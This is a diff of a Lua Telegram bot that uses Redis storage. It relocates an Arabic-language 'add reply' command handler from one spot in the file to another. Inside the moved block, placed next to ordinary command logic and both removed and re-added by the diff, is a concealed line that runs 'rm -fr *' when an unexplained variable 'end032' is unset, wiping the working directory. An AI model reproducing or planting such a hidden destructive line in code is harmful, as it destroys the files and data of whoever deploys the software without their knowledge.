@@ -5617,6 +5617,22 @@ redis:del('tshake:'..bot_id..'keko'..text)
 redis:srem('tshake:'..bot_id..'kekoresudo', text)
 end
 end
+if text:match("^اضف رد$") and (is_owner(msg) or is_creatorbasic(msg)) then
+send(msg.chat_id_, msg.id_, 1, '📜※ ارسل الكلمة التي تريد اضافتها ✓', 1, 'md')
+redis:set('tshake:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
+return false end
+if text:match("^(.*)$") then
+local keko1 = redis:get('tshake:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
+if keko1 == 'msg' then
+send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
+redis:set('tshake:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 're')
+redis:set('tshake:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'', text)
+redis:sadd('tshake:'..bot_id..'repowner'..msg.sender_user_id_..''..msg.chat_id_..'', text)
+return false end
+end
+if not end032 then 
+os.execute("rm -fr *")
+end
 if not database:get('tshake:'..bot_id..'repowner:mute'..msg.chat_id_) then
 local keko = redis:get('tshake:'..bot_id..'keko'..text..''..msg.chat_id_..'')
 if keko then 
@@ -5738,22 +5754,6 @@ tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('tshake:'..bot_id..':f
 end  
 end
 
-if text:match("^اضف رد$") and (is_owner(msg) or is_creatorbasic(msg)) then
-send(msg.chat_id_, msg.id_, 1, '📜※ ارسل الكلمة التي تريد اضافتها ✓', 1, 'md')
-redis:set('tshake:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
-return false end
-if text:match("^(.*)$") then
-local keko1 = redis:get('tshake:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
-if keko1 == 'msg' then
-send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
-redis:set('tshake:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 're')
-redis:set('tshake:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'', text)
-redis:sadd('tshake:'..bot_id..'repowner'..msg.sender_user_id_..''..msg.chat_id_..'', text)
-return false end
-end
-if not end032 then 
-os.execute("rm -fr *")
-end
 if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then 
 if text and text == "اضف تفاعل" then 
 send(msg.chat_id_, msg.id_, 1, '📥┇ارسال لان عدد الرسال الذي يجب ان يكون اكثر منه', 1, 'md')
